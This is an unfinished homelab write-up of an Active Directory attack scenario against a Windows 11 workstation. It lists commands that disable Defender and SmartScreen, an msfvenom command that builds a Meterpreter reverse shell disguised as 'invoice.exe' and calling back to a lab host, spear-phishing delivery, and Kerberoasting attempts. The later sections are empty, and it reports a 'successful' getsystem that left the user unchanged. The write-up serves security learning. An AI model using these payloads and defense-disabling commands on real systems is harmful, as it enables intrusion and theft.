# Protocol For Domain Takeover (adversary perspective)

## Target Environment Assumptions
- Windows 11 workstation misconfigured at the install by a junior administrator with:
    - disabled real-time antivirus monitoring
    - ICMP allowed through a custom firewall policy
- Domain joined workstation with standard user privileges
- Running SMB on port 445

## Lab Configuration Notes
Following commands were used to simulate the configuration of the environment:
- `Set-MpPreference -DisableRealtimeMonitoring $true`
- `netsh advfirewall firewall add rule name="Allow ICMPv4" protocol=icmpv4:8,any dir=in action=allow`
- `Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0`
- `netsh advfirewall firewall add rule name="Allow SMB" protocol=TCP dir=in localport=445 action=allow`
- `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"`
- `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0`
- `Set-MpPreference -DisableRealtimeMonitoring $true`
- `Set-MpPreference -DisableIOAVProtection $true`
- `Set-MpPreference -DisableScriptScanning $true`

## Scenario Context
- Attacker gained previous access onto our local network
- through a prior compromise like
    - phishing
    - credential theft of the Company VPN

## Reconnaissance
- We start by gathering information about our Target, in this case it would be a machine corresponding to the ip:192.168.1.10
- i will run an nmap scan to gather services that are up and their version, along with OS its running etc.
    - nmap -sV -sS -A -p- 192.168.1.10
![Nmap Result](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/nmap_scan.png)
- Information we gathered:
    - we have a hardened SMB2 with signing enabled and required running on port 445
        - SMB relay attacks are not viable due to signing requierements
    - couple of internal Windows services
    - Port 135 open running MSRPC, confirming its a Windows target
    - OS fingerprinted target as Windows 11 with 96% confidence
    - Single hop confirms direct LAN access

## Intitial Access (TA0001)
- We craft a malicious reverse TCP shell, with help of Meterpreter
- Shell would listen on port 4444
- We generate the Payload using msfvenom:
    - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.30 LPORT=4444 -f exe -o invoice.exe`
![MSFVENOM](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/msfvenom.png)
- I decided to use msfvenom in this instance, and not create my own tool, as it seemed more time efficient for my learning now
- To deliver payload we use a spear phishing email containing a malicious attachment disguised as legitimate invoice
    - Email appears to be a vendor payment requiest
    - Victim downloads and executes invoice.exe 
- Now we setup Metasploit listener
![Metasploit](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/metasploit.png)
- We wait until the target opens our malicious file
- After several tries of target trying to open our Payload, we get a successful connection
![Metasploit success](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/metasploitsuccess)
- We start with Enumeration
    - getuid
    - sysinfo
    - getprivs
![Enumeration](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/enumeration.png)
- What we found:
    - current user logged in LAB\user1 (standard domain user)
    - Machine is called TESTNAME1 joined to LAB domain
    - and current user only has standard priviledges, no administrative rights
- as we got logged in a simple user, we are required to try Privelege Escalation
- we try simplest escalation attempt
    - getsystem
- Meterpreter successfully escalated using technique 6
    - Named Pipe Impersonation via EFSRPC
    - EfsPotato abuses the Encrypting File System RPC interface to impersonate the SYSTEM token via a named pipe
- We run getuid again to confirm we were escalated
- We are still logged as user1
![getsystem+getuid](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/get_sysuid.png)
- we background the session and run exploit suggester, to find out which exploits might work on this specific target
- After running suggested exploits, i found out that user1 is not in the admin groups so priviledge escalation is unlikely
![user1 Groups](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/shell_groups.png)
- we can confirm that user1 is a standard domain user
- Member of BUILTIN\Users only 
- has medium integrity level
- which forces towards domain-level attacks
- New idea - Kerebroasting
- We proceed with kiwi and kerberos ticket list
![kiwi and kerberos ticket list](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/kiwi_kerb.png)
- Attempted Kerberoasting via impacket-GetUserSPNs
    - no service accounts with SPNs found
    - Domain too minimal for such attack vector
- we run several other attempts
![impacket](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/ad_scenario/screenshots/impacket.png)

## Persistence (TA0003)

## Privilege Escalation (TA0004)

## Credential Access (TA0006)

## Lateral Movement (TA0008)

## Domain Dominance

## Outcome
